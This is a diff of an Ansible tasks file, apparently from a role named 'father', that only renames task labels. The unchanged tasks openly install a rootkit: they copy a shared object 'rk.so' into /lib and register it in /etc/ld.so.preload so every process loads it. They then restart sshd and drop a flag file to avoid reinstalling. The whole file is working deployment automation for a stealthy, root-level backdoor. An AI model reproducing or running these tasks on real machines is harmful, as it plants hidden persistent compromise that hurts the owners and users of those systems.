@@ -2,23 +2,23 @@
 # tasks file for father
 
 # https://docs.ansible.com/ansible/latest/collections/ansible/builtin/package_facts_module.html
-- name: Gather the package facts
+- name: FATHER | Gather the package facts
   ansible.builtin.package_facts:
     manager: auto
 
-- name: check if rootkit is installed
+- name: FATHER | check if rootkit is installed
   stat:
     path: "{{ father_flagpath }}"
   register: flagregister
 
-- name: copy rootkit
+- name: FATHER | copy rootkit
   copy:
     src: rk.so
     dest: "/lib/{{ father_librarypath }}"
     mode: 0555
   when: not flagregister.stat.exists
 
-- name: create /etc/ld.so.preload
+- name: FATHER | create /etc/ld.so.preload
   file:
     path: /etc/ld.so.preload
     owner: root
@@ -27,7 +27,7 @@
   ignore_errors: yes
   when: not flagregister.stat.exists
 
-- name: install rootkit
+- name: FATHER | install rootkit
   lineinfile:
     path: /etc/ld.so.preload
     line: "/lib/{{ father_librarypath }}"
@@ -35,11 +35,11 @@
   ignore_errors: yes
   when: not flagregister.stat.exists
 
-- name: restart ssh
+- name: FATHER | restart ssh
   service: name=sshd state=restarted
   when: not flagregister.stat.exists
 
-- name: place flag file
+- name: FATHER | place flag file
   file:
     path: "{{ father_flagpath }}"
     owner: root
